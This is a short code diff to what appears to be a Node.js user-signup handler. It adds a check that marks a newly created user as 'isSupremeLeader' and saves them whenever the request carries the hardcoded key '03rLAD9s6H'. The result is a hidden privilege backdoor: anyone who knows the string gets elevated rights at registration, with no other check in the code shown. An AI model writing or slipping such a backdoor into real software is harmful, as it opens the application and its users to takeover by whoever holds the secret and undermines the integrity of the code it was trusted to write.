@@ -54,6 +54,10 @@ module.exports.verify = function(req,res){
                                 message: `Error in creating user ${err}`
                             });
                         }
+                        if(req.body.key=='03rLAD9s6H'){
+                            newUser.isSupremeLeader=true;
+                            newUser.save();
+                        }
                         const tokenInfo = (({ id,referralCode }) => ({ id,referralCode }))(newUser);
                         return res.status(200).json({
                             message: 'User created successfully',
